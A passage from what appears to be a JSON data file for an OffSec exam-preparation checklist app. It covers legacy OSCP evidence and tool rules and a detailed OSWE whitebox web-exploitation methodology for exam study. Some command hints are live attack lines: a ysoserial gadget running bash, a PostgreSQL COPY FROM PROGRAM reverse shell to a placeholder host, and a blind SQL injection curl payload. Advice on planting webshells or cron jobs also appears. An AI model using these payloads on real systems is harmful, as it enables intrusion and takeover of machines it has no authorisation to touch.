     "text": "Interfaces built on Metasploit — Armitage, Cobalt Strike, Metasploit Community Edition — inherit the same one-machine limit rather than being separately banned. (Cobalt Strike is separately out under the commercial-tools rule.)",
     "enforceable": "budget:metasploit:1",
     "source": "http://web.archive.org/web/2024080100/https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide"
    }
   ],
   "evidenceRules": [
    {
     "appliesTo": "*",
     "requirement": "Each local.txt and proof.txt must be shown in a screenshot that includes the contents of the file AS WELL AS the IP address of the target, obtained with ipconfig, ifconfig or ip addr — both in the same frame. (Wording identical to the current guide.)",
     "source": "http://web.archive.org/web/2024080100/https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    },
    {
     "appliesTo": "*",
     "requirement": "Proof file contents must be obtained in an interactive shell on the target with cat or type, from the file's original location. Any other method — including any type of web-based shell — scores zero for that target.",
     "source": "https://web.archive.org/web/20240719171726/https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    },
    {
     "appliesTo": "*",
     "requirement": "Flag contents must also be submitted in the exam control panel before the exam ends; missing either the panel submission or the screenshot scores zero for that target.",
     "source": "https://web.archive.org/web/20240719171726/https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    },
    {
     "appliesTo": "legacy-ad-dc",
     "requirement": "The AD set is all-or-nothing: evidence must show the complete chain across all three hosts. Screenshots for the two clients are required even though they carry no points of their own, because the 40 points are only awarded for the full domain chain.",
     "source": "http://web.archive.org/web/2024080100/https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    },
    {
     "appliesTo": "*",
     "requirement": "Modified exploits must be documented with the modified code, the URL of the original, the shellcode generation command, highlighted changes and an explanation; unmodified exploits with the URL alone.",
     "source": "https://web.archive.org/web/20240719171726/https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    }
   ],
   "reportSections": [
    "OffSec Certified Professional Exam Report — Introduction",
    "Objective",
    "Requirements",
    "High-Level Summary",
    "Recommendations",
    "Methodologies — Information Gathering",
    "Methodologies — Service Enumeration",
    "Methodologies — Penetration",
    "Methodologies — Maintaining Access",
    "Methodologies — House Cleaning",
    "Independent Challenges — Target #N: Initial Access",
    "Independent Challenges — Target #N: Service Enumeration",
    "Independent Challenges — Target #N: Privilege Escalation",
    "Independent Challenges — Target #N: Post Exploitation (local.txt / proof.txt)",
    "Active Directory Set — Host #N: Initial Access",
    "Active Directory Set — Host #N: Privilege Escalation",
    "Active Directory Set — Host #N: Post-Exploitation (flag)",
    "Additional Items Not Mentioned in the Report"
   ],
   "sources": [
    "https://web.archive.org/web/20240719171726/https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
    "https://help.offsec.com/hc/en-us/articles/29865898402836-OSCP-Exam-Changes",
    "http://web.archive.org/web/2024080100/https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
    "https://help.offsec.com/hc/en-us/articles/29865898402836-OSCP-Exam-Changes",
    "https://help.offsec.com/hc/en-us/articles/29840452210580-Changes-to-the-OSCP",
    "https://www.offsec.com/pwk-online/OSCP-Exam-Report.docx"
   ],
   "unverified": [
    "IMPLEMENTATION NOTE — the phases `setup`, `recon`, `svc-enum`, `web-discovery`, `foothold`, `shell`, `local-flag`, `sitawareness`, `privesc`, `proof-flag` and `evidence` are byte-for-byte the same methodology as the OSCP+ preset apart from a few wording changes. Compile them once as a shared phase set and have both presets reference it; only the AD phases, the bonus phase and the scoring differ.",
    "PLAYBOOK OVERLAP — same as the OSCP+ preset: recon/svc-enum ↔ `initial-recon`; web-discovery ↔ `web`; foothold/shell ↔ `general`; privesc ↔ `linux-privesc` + `windows-privesc`; legacy-ad-* ↔ `ad` and `ad-detailed` (the legacy AD set genuinely starts unauthenticated, so `ad-detailed` phase 0 maps well here EXCEPT its Responder/ntlmrelayx items, which are banned); legacy-ad-lateral pivot items ↔ `pivoting`.",
    "Whether a stack buffer-overflow target appeared in this format's independent targets is not stated in the archived guide, so the existing `buffer-overflow` playbook is not wired in. Many pre-2022 write-ups assume one; that assumption is not verified here.",
    "Report section headings are taken from the current official OSCP Exam Report template v2.0 (Copyright 2024), which was already in use before the format change; an older template version may differ in minor heading names.",
    "Which of local.txt / proof.txt sat on each individual AD host in the retired format is not stated; the 2-clients-plus-1-DC shape and the all-or-nothing 40 points are both confirmed."
   ],
   "notes": [
    "Buffer overflow targets are out of scope: OffSec removed BOF from the course material and the exam body of knowledge. What remains in scope is FIXING a public memory-corruption exploit — cross-compiling it, correcting offsets and shellcode — which is a different skill.",
    "Taught in PEN-200, banned on the exam: the current Body of Knowledge still includes \"Vulnerability Scanning with Nessus\", while the exam guide bans Nessus outright."
   ],
   "legacy": true,
   "kind": "targets",
   "appFeatures": []
  },
  {
   "id": "oswe",
   "name": "OSWE (WEB-300)",
   "icon": "🔬",
   "tagline": "Whitebox source-code review: you get the source, you find the chain, you ship one exploit script that does it all unattended.",
   "focus": "webapp",
   "durationMin": 2865,
   "reportHours": 24,
   "passMark": 85,
   "totalPoints": 100,
   "scoringNote": "OffSec publishes only that 85 of a maximum 100 points is required to pass, and refers to \"several target machines\" without stating how many or how the points split. Take the per-target values from your own Exam Control Panel — this app will not invent them.",
   "targets": [
    {
     "key": "oswe-target-1",
     "label": "Exam Target 1 — web application (full source provided)",
     "kind": "webapp",
     "points": null,
     "flags": [
      {
       "id": "oswe-t1-local",
       "label": "local.txt (via authentication bypass / admin session)",
       "points": null,
       "pointsUnknown": true
      },
      {
       "id": "oswe-t1-proof",
       "label": "proof.txt (via remote code execution)",
       "points": null,
       "pointsUnknown": true
      }
     ],
     "pointsUnknown": true
    },
    {
     "key": "oswe-target-2",
     "label": "Exam Target 2 — web application (full source provided)",
     "kind": "webapp",
     "points": null,
     "flags": [
      {
       "id": "oswe-t2-local",
       "label": "local.txt (via authentication bypass / admin session)",
       "points": null,
       "pointsUnknown": true
      },
      {
       "id": "oswe-t2-proof",
       "label": "proof.txt (via remote code execution)",
       "points": null,
       "pointsUnknown": true
      }
     ],
     "pointsUnknown": true
    }
   ],
   "phases": [
    {
     "id": "oswe-env",
     "name": "Environment & Debugging Setup",
     "goal": "The app runs locally, a debugger is attached and hitting source-level breakpoints, and you can see every query, error and log line the app produces.",
     "items": [
      {
       "label": "Snapshot the local VM/appliance before touching anything — you will break this app repeatedly and want a 10-second rollback",
       "hint": ""
      },
      {
       "label": "Get the application running locally from the provided source or appliance; confirm the login page renders and a normal login works end to end",
       "hint": ""
      },
      {
       "label": "Put Burp in front of everything, including your own local instance — you want request/response history from minute one",
       "hint": "curl -sk -x http://127.0.0.1:8080 <TARGET_URL>"
      },
      {
       "label": "Attach a debugger — Node/JavaScript (then attach VS Code or chrome://inspect)",
       "hint": "node --inspect-brk=0.0.0.0:9229 app.js"
      },
      {
       "label": "Attach a debugger — PHP via Xdebug (listener in your IDE on 9003)",
       "hint": "php -dxdebug.mode=debug -dxdebug.start_with_request=yes -dxdebug.client_host=127.0.0.1 -dxdebug.client_port=9003 -S 0.0.0.0:<PORT>"
      },
      {
       "label": "Attach a debugger — Java via JDWP, then attach IntelliJ/Eclipse to the port",
       "hint": "java -agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=*:<PORT> -jar app.jar"
      },
      {
       "label": "Attach a debugger — .NET: run the app under dnSpy, or attach dnSpy to the w3wp/dotnet process; decompile assemblies with dnSpy or ILSpy first",
       "hint": ""
      },
      {
       "label": "Attach a debugger — Python",
       "hint": "python3 -m debugpy --listen 0.0.0.0:<PORT> --wait-for-client app.py"
      },
      {
       "label": "Decompile before you debug where there is no source: Java JARs with procyon/jd-cli, .NET assemblies with ILSpy/dnSpy",
       "hint": "procyon -jar app.jar -o ./src-decompiled"
      },
      {
       "label": "Tail the web server and application logs in a dedicated pane for the whole exam",
       "hint": "tail -F /var/log/apache2/error.log /var/log/nginx/error.log /var/log/tomcat*/catalina.out 2>/dev/null"
      },
      {
       "label": "Turn on the database general query log — seeing the exact SQL the app builds is the single fastest way to spot string concatenation",
       "hint": "mysql -e \"SET GLOBAL general_log=1; SET GLOBAL general_log_file='/tmp/gq.log';\" && tail -F /tmp/gq.log"
      },
      {
       "label": "PostgreSQL equivalent: log every statement the app issues",
       "hint": "psql -c \"ALTER SYSTEM SET log_statement='all';\" -c \"SELECT pg_reload_conf();\""
      },
      {
       "label": "Enable the framework's verbose/debug error mode on your LOCAL copy only — never change state on the exam target",
       "hint": ""
      },
      {
       "label": "Prove the toolchain works before you trust it: set a breakpoint on the login handler, submit a bad password, confirm it halts and you can read the variables",
       "hint": ""
      },
      {
       "label": "Keep a running log of what you tried and what the app did — on a 48-hour exam you will otherwise repeat work at hour 30",
       "hint": ""
      }
     ]
    },
    {
     "id": "oswe-orient",
     "name": "Source Acquisition & Orientation",
     "goal": "You can name the framework and its version, list every route, point at the authentication layer, and say which dependencies are old enough to matter.",
     "items": [
      {
       "label": "Identify the framework and version from the manifest before reading a single line of application code",
       "hint": "ls -1 package.json composer.json pom.xml build.gradle requirements.txt Gemfile *.csproj 2>/dev/null"
      },
      {
       "label": "Read dependency versions and flag anything with a known deserialization, template-injection or RCE issue — the bug is sometimes in a library, not the app",
       "hint": "cat package.json composer.json pom.xml 2>/dev/null"
      },
      {
       "label": "Diff the patched release against the vulnerable one. If both versions are obtainable, the patch IS the writeup",
       "hint": "diff -ruN old/ new/ | rg -n '^[+-]' | rg -v '^(\\+\\+\\+|---)'"
      },
      {
       "label": "Same trick inside a git repo — read the security-relevant commits and tag-to-tag diffs",
       "hint": "git log --oneline -40 && git diff <OLD_TAG>..<NEW_TAG> -- '*.php' '*.js' '*.java' '*.cs' '*.py'"
      },
      {
       "label": "Build a routing map: every URL the app exposes, the handler behind it, and whether it requires auth. Keep it as a table you extend all exam",
       "hint": ""
      },
      {
       "label": "Enumerate routes — Express/Node",
       "hint": "rg -tjs -tts -n '(app|router)\\.(get|post|put|patch|delete|all|use)\\(' ."
      },
      {
       "label": "Enumerate routes — Spring / JAX-RS",
       "hint": "rg -tjava -n '@(Request|Get|Post|Put|Delete|Patch)Mapping|@Path\\(' ."
      },
      {
       "label": "Enumerate routes — ASP.NET MVC / Web API",
       "hint": "rg -tcs -n '\\[Http(Get|Post|Put|Delete)\\]|\\[Route\\(|MapControllerRoute' ."
      },
      {
       "label": "Enumerate routes — PHP front controller and raw superglobals",
       "hint": "rg -tphp -n 'Route::|\\$_(GET|POST|REQUEST|COOKIE|SERVER|FILES)' ."
      },
      {
       "label": "Enumerate routes — Flask / Django",
       "hint": "rg -tpy -n '@(app|bp)\\.route|urlpatterns|\\bpath\\(|re_path\\(' ."
      },
      {
       "label": "Locate the authentication layer and read it end to end before anything else — how is a user identified, and what exactly is checked",
       "hint": "rg -n -i 'login|authenticate|signin|session_start|setcookie|IsAuthenticated|current_user' ."
      },
      {
       "label": "Map which routes SKIP the auth middleware. This is where the bypass lives, and it is the highest-value hour of the exam",
       "hint": ""
      },
      {
       "label": "Express: routes registered BEFORE app.use(authMiddleware), and any router mounted outside the protected tree",
       "hint": "rg -tjs -tts -n 'app\\.use\\(|requireAuth|isAuthenticated|ensureLoggedIn|passport\\.authenticate' ."
      },
      {
       "label": ".NET: every [AllowAnonymous], and every controller or action with no [Authorize] at all",
       "hint": "rg -tcs -n '\\[AllowAnonymous\\]|\\[Authorize' ."
      },
      {
       "label": "Spring Security: permitAll() matchers, matcher ordering, and filters added before the auth filter",
       "hint": "rg -tjava -n 'permitAll|antMatchers|requestMatchers|addFilterBefore|@PreAuthorize|WebSecurityConfig' ."
      },
      {
       "label": "PHP: files that do not include the auth bootstrap — compare every entry point against the ones that do",
       "hint": "rg -tphp -L -n 'require.*auth|session_start' --files-without-match ."
      },
      {
       "label": "Find the admin boundary: how does the app decide someone is an administrator, and is that decision made from data the user can influence",
       "hint": "rg -n -i 'is_?admin|role|privilege|is_?superuser|UserLevel|permissions' ."
      },
      {
       "label": "Write down the trust boundary explicitly: which parameters are attacker-controlled on an UNAUTHENTICATED route. Everything after this phase is reachability analysis against that list",
       "hint": ""
      }
     ]
    },
    {
     "id": "oswe-static",
     "name": "Static Analysis — Sources & Sinks",
     "goal": "Every dangerous sink in the codebase is inventoried, and for each one you know whether an unauthenticated user can reach it.",
     "items": [
      {
       "label": "Work sink-first, not source-first: enumerate the dangerous sinks, then ask which are reachable pre-auth. Tracing forward from every input on a large app never finishes",
       "hint": ""
      },
      {
       "label": "JS/Node — command execution and dynamic evaluation",
       "hint": "rg -tjs -tts -n 'child_process|\\bexec(Sync)?\\(|\\bspawn(Sync)?\\(|\\beval\\(|new Function\\(|vm\\.(run|runInNewContext|runInThisContext)' ."
      },
      {
       "label": "JS/Node — deserialization and prototype pollution gadgets",
       "hint": "rg -tjs -tts -n 'node-serialize|unserialize\\(|__proto__|constructor\\s*\\[|lodash\\.(merge|mergeWith|set|setWith|defaultsDeep)|extend\\(\\s*true|Object\\.assign\\(' ."
      },
      {
       "label": "JS/Node — SQL built by concatenation or template literal",
       "hint": "rg -tjs -tts -n '\\.query\\([^)]*(\\+|\\$\\{)|knex\\.raw\\(|sequelize\\.query\\(|\\.rawQuery\\(' ."
      },
      {
       "label": "JS/Node — NoSQL operator injection: a request object handed straight to a Mongo filter lets $ne/$gt/$regex through",
       "hint": "rg -tjs -tts -n 'findOne\\(\\s*(req|request)\\.|\\$where|\\{\\s*\\$(ne|gt|regex)' ."
      },
      {
       "label": "Java — deserialization sinks (the classic OSWE RCE primitive)",
       "hint": "rg -tjava -n 'readObject\\(|ObjectInputStream|readUnshared|XMLDecoder|SerializationUtils\\.deserialize|Yaml\\(\\)\\.load|readValue\\(' ."
      },
      {
       "label": "Java — command execution and SQL concatenation",
       "hint": "rg -tjava -n 'Runtime\\.getRuntime\\(\\)\\.exec|ProcessBuilder|createQuery\\([^)]*\\+|createNativeQuery\\([^)]*\\+|\\bStatement\\b' ."
      },
      {
       "label": "Java — XXE-capable parsers left on defaults (no FEATURE_SECURE_PROCESSING, DTDs not disabled)",
       "hint": "rg -tjava -n 'DocumentBuilderFactory|SAXParserFactory|XMLInputFactory|TransformerFactory|SAXReader|Unmarshaller' ."
      },
      {
       "label": "Java — template and expression-language injection",
       "hint": "rg -tjava -n 'TemplateEngine|Velocity|freemarker|SpelExpressionParser|OgnlUtil|MVEL|ScriptEngineManager' ."
      },
      {
       "label": "C#/.NET — deserialization formatters and ViewState handling",
       "hint": "rg -tcs -n 'BinaryFormatter|LosFormatter|ObjectStateFormatter|NetDataContractSerializer|JavaScriptSerializer|TypeNameHandling|__VIEWSTATE|MachineKey|validationKey' ."
      },
      {
       "label": "C#/.NET — command execution, raw SQL and XXE",
       "hint": "rg -tcs -n 'Process\\.Start|SqlCommand\\([^)]*\\+|ExecuteSqlRaw|FromSqlRaw|XmlDocument|XmlTextReader|DtdProcessing|XmlResolver' ."
      },
      {
       "label": "PHP — the classic RCE sink set, including the /e preg_replace modifier",
       "hint": "rg -tphp -n '\\b(eval|assert|system|exec|shell_exec|passthru|popen|proc_open|pcntl_exec)\\s*\\(|preg_replace\\s*\\(\\s*.[^,]*/[a-z]*e' ."
      },
      {
       "label": "PHP — object injection sinks and the magic methods that form a POP chain",
       "hint": "rg -tphp -n 'unserialize\\s*\\(|__wakeup|__destruct|__toString|__call|__invoke' ."
      },
      {
       "label": "PHP — dynamic includes, variable variables and callable injection",
       "hint": "rg -tphp -n '(include|require)(_once)?\\s*\\(?\\s*\\$|\\$\\$|call_user_func(_array)?|extract\\s*\\(|create_function' ."
      },
      {
       "label": "PHP — type juggling in auth and token comparison: loose == on hashes, strcmp with an array, magic hashes beginning 0e",
       "hint": "rg -tphp -n '[^=!<>]==[^=]|strcmp\\(|strcasecmp\\(|in_array\\([^,]+,[^,)]+\\)|hash_equals' ."
      },
      {
       "label": "Python — deserialization, eval and shell execution",
       "hint": "rg -tpy -n 'pickle\\.loads?|cPickle|yaml\\.load\\(|\\beval\\(|\\bexec\\(|os\\.(system|popen)|subprocess\\.[a-z]+\\([^)]*shell\\s*=\\s*True' ."
      },
      {
       "label": "Python — SSTI, XXE and unsafe path joining",
       "hint": "rg -tpy -n 'render_template_string|Template\\(|jinja2|etree\\.(parse|fromstring)|lxml|os\\.path\\.join\\(' ."
      },
      {
       "label": "Any language — path traversal and arbitrary file write primitives",
       "hint": "rg -n 'file_put_contents|move_uploaded_file|fopen\\(|new FileOutputStream|Path\\.Combine|os\\.path\\.join|fs\\.(write|createWrite)|\\.\\./' ."
      },
      {
       "label": "Mass assignment / over-permissive model binding: request data bound onto an object that carries isAdmin, role or userId",
       "hint": "rg -n 'TryUpdateModel|UpdateModel|\\[Bind\\(|->fill\\(|\\$guarded|\\$fillable|Object\\.assign\\(\\s*user|\\*\\*request\\.(POST|json)|new\\s+\\w+\\(\\s*req\\.body' ."
      },
      {
       "label": "JWT and session handling: alg none, algorithm confusion (RS256 verified as HS256), verification switched off, hardcoded or guessable secret",
       "hint": "rg -n -i 'jsonwebtoken|\\bjwt\\b|HS256|RS256|\"alg\"|verify\\s*[:=]\\s*(false|False)|ignoreExpiration|secret\\s*[:=]' ."
      },
      {
       "label": "How are session IDs, password-reset tokens and CSRF tokens GENERATED? A token seeded from time() or rand() is a whole exam objective on its own",
       "hint": "rg -n 'Math\\.random|mt_rand|\\brand\\(|srand|uniqid\\(|new Random\\(|time\\(\\)|microtime\\(|\\bmd5\\(|\\bsha1\\(' ."
      },
      {
       "label": "Password-reset and account-takeover logic: token not bound to the requesting account, token reusable or never invalidated, reset link built from the Host header, username-vs-email confusion, account merge on registration",
       "hint": "rg -n -i 'reset|forgot|recover|verify_email|change_password|confirm_token' ."
      },
      {
       "label": "Race conditions: check-then-act on balances, invite codes, one-time tokens, or upload-then-validate where the file is reachable between the two steps",
       "hint": ""
      },
      {
       "label": "Read every place the app compares a secret and every place it decides 'is this user an administrator' — in a whitebox exam those two decisions are usually where the 35 points are",
       "hint": ""
      },
      {
       "label": "For each sink you found, record: file:line, the parameter that reaches it, and whether auth is required. Sinks you cannot reach are noise — cross them off explicitly",
       "hint": ""
      }
     ]
    },
    {
     "id": "oswe-authbypass",
     "name": "Authentication Bypass Development",
     "goal": "You hold a valid authenticated administrator session, reproducibly, starting from a completely unauthenticated state.",
     "items": [
      {
       "label": "Pick the single most promising pre-auth reachable sink and PROVE reachability with a breakpoint before writing any exploit code",
       "hint": ""
      },
      {
       "label": "Trace the input from the raw HTTP request to the sink in the debugger, noting every filter, transform, encode and decode on the way",
       "hint": ""
      },
      {
       "label": "Test the filter rather than guessing it: feed it the exact bytes it rejects and watch which branch runs. Whitebox means you never have to guess",
       "hint": ""
      },
      {
       "label": "Bypass shapes worth checking against your sink list: SQLi in the login query, type juggling on a password hash, NoSQL operator injection, predictable reset token, JWT alg/none or weak HMAC secret, session fixation, second-order injection via registration, mass assignment of a role field",
       "hint": ""
      },
      {
       "label": "Blind/boolean SQLi: establish a reliable oracle (a response that differs cleanly for true vs false) BEFORE writing the extraction loop — sqlmap is banned on this exam, you are writing this by hand",
       "hint": "curl -sk -x http://127.0.0.1:8080 <TARGET_URL>/login --data-urlencode \"user=admin' AND SUBSTRING(password,1,1)='a'-- -\" --data \"pass=x\""
      },
      {
       "label": "Write the extraction as a binary search over the character set, not a linear scan — on a 48-hour clock the difference is real",
       "hint": ""
      },
      {
       "label": "If you extract a hash, check in the source whether the app compares the hash or the plaintext. You may not need to crack anything at all",
       "hint": ""
      },
      {
       "label": "If the app signs cookies or tokens, check whether the signing key is in the repo, derived from something predictable, or simply not verified",
       "hint": ""
      },
      {
       "label": "Forge or steal the administrator session, then confirm it against an admin-only route",
       "hint": "curl -sk -b cookies.txt <TARGET_URL>/admin | head -40"
      },
      {
       "label": "Capture local.txt from the administration section the moment you have admin — bank the points before chasing RCE",
       "hint": ""
      },
      {
       "label": "Write the bypass as a self-contained function NOW, while it is fresh. Retro-fitting it into a script at hour 40 is how people fail with working exploits",
       "hint": ""
      },
      {
       "label": "Re-test the bypass against a freshly reverted target — a bypass that depends on state you created earlier is not an exploit",
       "hint": ""
      }
     ]
    },
    {
     "id": "oswe-rce",
     "name": "Escalating the Bypass to RCE",
     "goal": "Code execution on the target as the web process, reached from the authenticated session your bypass produces.",
     "items": [
      {
       "label": "Re-run your sink inventory with administrator privileges in mind — most OSWE RCE sits behind the auth boundary you just crossed",
       "hint": ""
      },
      {
       "label": "Admin-only paths to code, in rough order of frequency: file upload with controllable extension or path, template/theme editor, plugin installer, backup and restore, log-file path configuration, scheduled task, database console, and 'test connection' fields that shell out",
       "hint": ""
      },
      {
       "label": "Java deserialization: build the gadget chain with ysoserial — payload generators are explicitly permitted on this exam",
       "hint": "java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,<HASH>}|{base64,-d}|{bash,-i}' | base64 -w0"
      },
      {
       "label": ".NET ViewState or BinaryFormatter once you have recovered the machineKey from the source or a config file",
       "hint": "ysoserial.exe -p ViewState -g TypeConfuseDelegate -c \"cmd /c ping <ATTACKER_IP>\" --validationkey=<HASH> --validationalg=SHA1"
      },
      {
       "label": "PHP object injection: find a POP chain in the application's OWN classes (__destruct, __wakeup, __toString) rather than hoping a library gadget is loaded",
       "hint": "rg -tphp -n '__destruct|__wakeup|__toString' ."
      },
      {
       "label": "Node prototype pollution rarely gives RCE alone — hunt the downstream gadget: polluted child_process spawn options, a template engine reading a polluted option, or require-cache manipulation",
       "hint": ""
      },
      {
       "label": "SSTI: fingerprint the engine with an arithmetic probe first, then use the engine-specific escape to the runtime rather than a copied one-liner",
       "hint": ""
      },
      {
       "label": "Turn a file-write primitive into execution: webshell into the docroot, an SSH authorized_keys entry, a cron or systemd unit, or overwriting a file the app itself executes",
       "hint": ""
      },
      {
       "label": "SQLi to RCE where the DBMS permits it — MySQL INTO OUTFILE, PostgreSQL COPY FROM PROGRAM, MSSQL xp_cmdshell",
       "hint": "COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"';"
      },
      {
       "label": "Catch the shell",
       "hint": "rlwrap nc -lvnp <LPORT>"
      },
      {
       "label": "Stabilise the shell enough to read files reliably",
       "hint": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'; export TERM=xterm"
      },
      {
       "label": "Take proof.txt and screenshot it from its original location, with the target's IP visible in the same frame",
       "hint": "ip a; cat /proof.txt 2>/dev/null || type C:\\proof.txt"
      },
      {
       "label": "Write down every artefact you created — uploaded files, added users, modified config. Your exploit script has to clean these up, and your report has to disclose them",
       "hint": ""
      }
     ]
    },
    {
     "id": "oswe-chain",
     "name": "Standalone Exploit Script — the actual deliverable",
     "goal": "One script per target that takes an unauthenticated start to shell or printed proof values, with zero grader interaction, on a freshly reverted box.",
     "items": [
      {
       "label": "Understand what is being graded: the grader runs your PoC and does nothing else while it runs. A perfect finding with a script that needs a manual step loses points",
       "hint": ""
      },
      {
       "label": "Scaffold with real argument handling, never hardcoded addresses",
       "hint": "python3 exploit.py --target <TARGET_URL> --lhost <LHOST> --lport <LPORT>"
      },
      {
       "label": "Python skeleton: argparse, ONE requests.Session so cookies carry across stages, verify=False with warnings silenced, and a --proxy switch you can flip to Burp while developing",
       "hint": "python3 -c \"import requests,urllib3; urllib3.disable_warnings(); s=requests.Session(); s.verify=False; s.proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}\""
      },
      {
       "label": "Chain the stages in order, each as its own function with a clear return value: prepare/register -> authentication bypass -> authenticated action -> RCE trigger -> callback or proof extraction",
       "hint": ""
      },
      {
       "label": "Print a one-line status at each stage to stdout so the grader can see how far it got and where it failed",
       "hint": ""
      },
      {
       "label": "Decide the shell strategy and state it plainly at the top of the script. Starting a netcat listener or an Apache/HTTP server BEFORE running the script is permitted; manual steps DURING the run are not",
       "hint": "python3 -m http.server <PORT> & rlwrap nc -lvnp <LPORT>"
      },
      {
       "label": "If your exploit does NOT return a reverse shell, the script MUST extract and print the proof values automatically — this is an explicit requirement, not a nicety",
       "hint": ""
      },
      {
       "label": "Make it reliable: retry transient network failures, poll for a condition instead of sleeping and hoping, and generate a fresh random username/token/filename per run so a second execution does not collide with the first",
       "hint": ""
      },
      {
       "label": "Clean up: delete uploaded webshells, remove created accounts, restore configuration the script changed. A grader re-running it on a dirty box should still succeed",
       "hint": ""
      },
      {
       "label": "Revert the target, run the script once end to end from genuinely clean state, then revert and run it AGAIN. Two clean runs is the bar",
       "hint": ""
      },
      {
       "label": "Read the script as a grader would: no absolute paths from your machine, no leftover debug output containing your own notes, no undeclared dependency, no reliance on a file you left on the target during research",
       "hint": ""
      },
      {
       "label": "Paste the complete PoC source into the report as text — base64 of the script is also accepted and the grader will decode it. Do NOT upload the script as a separate file",
       "hint": ""
      },
      {
       "label": "Sanity-check the script runs on a clean Kali with only the declared packages installed",
       "hint": "python3 -m venv /tmp/clean && /tmp/clean/bin/pip install requests && /tmp/clean/bin/python exploit.py --target <TARGET_URL> --lhost <LHOST> --lport <LPORT>"
      }
     ]
    },
    {
     "id": "oswe-report",
     "name": "Proof Capture & Reporting",
     "goal": "Proof values submitted in the Control Panel before the clock stops, and a PDF that a technically competent stranger can follow step by step.",
     "items": [
      {
       "label": "Submit the local.txt and proof.txt values in the Exam Control Panel BEFORE the exam time expires — this is separate from the report",
       "hint": ""
      },
      {
       "label": "Screenshot the contents of local.txt and proof.txt exactly as the Control Panel objectives require, with the target IP visible in the same screenshot",
       "hint": "ip a; cat /proof.txt"
      },
      {
       "label": "Document each vulnerability separately: the method used to find it, the vulnerable code with file and line, and the steps to trigger it",
       "hint": ""
      },
      {
       "label": "Include the full PoC source for every target inside the PDF",
       "hint": ""
      },
      {
       "label": "Write the Steps section so the attack can be replicated step by step — missing steps cost points, and once submitted you cannot add anything",
       "hint": ""
      },
      {
       "label": "Export to PDF and re-open it to check nothing reflowed or got cut off, especially code blocks and screenshots",
       "hint": ""
      },
      {
       "label": "Package with the exact case-sensitive filename, no password, under 200MB",
       "hint": "7z a OSWE-OS-XXXXX-Exam-Report.7z OSWE-OS-XXXXX-Exam-Report.pdf && md5sum OSWE-OS-XXXXX-Exam-Report.7z"
      },
      {
       "label": "Upload the single .7z to upload.offsec.com within 24 hours, compare the MD5 shown against your local hash, then click Submit File and confirm the acknowledgement email arrives",
       "hint": ""
      }
     ]
    }
   ],
   "rules": [
    {
     "kind": "banned",
     "text": "Source code analyzers are prohibited.",
     "enforceable": "ban:sast",
     "source": "https://help.offsec.com/hc/en-us/articles/360046869951-WEB-300-Advanced-Web-Attacks-and-Exploitation-OSWE-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "Automatic exploitation tools (e.g. db_autopwn, browser_autopwn, SQLmap, SQLninja, etc.).",
     "enforceable": "ban:autoexploit",
     "source": "https://help.offsec.com/hc/en-us/articles/360046869951-WEB-300-Advanced-Web-Attacks-and-Exploitation-OSWE-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "Mass vulnerability scanners (e.g. Nessus, NeXpose, OpenVAS, Canvas, Core Impact, SAINT, etc.).",
     "enforceable": "ban:scanners",
     "source": "https://help.offsec.com/hc/en-us/articles/360046869951-WEB-300-Advanced-Web-Attacks-and-Exploitation-OSWE-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "AI chatbots and LLMs with direct prompt access (ChatGPT, OffSec KAI, Gemini, Deepseek, etc.) — treated as third-party help under the Academic Policy. Tools with incidental built-in AI features (Notion, Google AI Overview) need not be disabled.",
     "enforceable": "ban:ai",
     "source": "https://help.offsec.com/hc/en-us/articles/360046869951-WEB-300-Advanced-Web-Attacks-and-Exploitation-OSWE-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "Remote mounting of application source code (e.g. sshfs, sftp) is not allowed.",
     "enforceable": "ban:remote-mount",
     "source": "https://help.offsec.com/hc/en-us/articles/360046869951-WEB-300-Advanced-Web-Attacks-and-Exploitation-OSWE-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "Downloading any applications, files or source code from the exam environment to your local machine is strictly forbidden.",
     "enforceable": "ban:exfil",
     "source": "https://help.offsec.com/hc/en-us/articles/360046869951-WEB-300-Advanced-Web-Attacks-and-Exploitation-OSWE-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "Features in other tools that utilise either forbidden or restricted exam limitations.",
     "enforceable": "",
     "source": "https://help.offsec.com/hc/en-us/articles/360046869951-WEB-300-Advanced-Web-Attacks-and-Exploitation-OSWE-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "Seeking or receiving assistance from other people, including on Discord. Searching Discord for information is permitted; asking for help is not.",
     "enforceable": "",
     "source": "https://help.offsec.com/hc/en-us/articles/360046869951-WEB-300-Advanced-Web-Attacks-and-Exploitation-OSWE-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "Nmap (including NSE), Nikto, Burp Free, DirBuster, and payload generator tools such as msfvenom and ysoserial may be used against any target.",
     "enforceable": "",
     "source": "https://help.offsec.com/hc/en-us/articles/360046869951-WEB-300-Advanced-Web-Attacks-and-Exploitation-OSWE-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "X11 forwarding can be used during the exam.",
     "enforceable": "",
     "source": "https://help.offsec.com/hc/en-us/articles/360046869951-WEB-300-Advanced-Web-Attacks-and-Exploitation-OSWE-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "allowed",
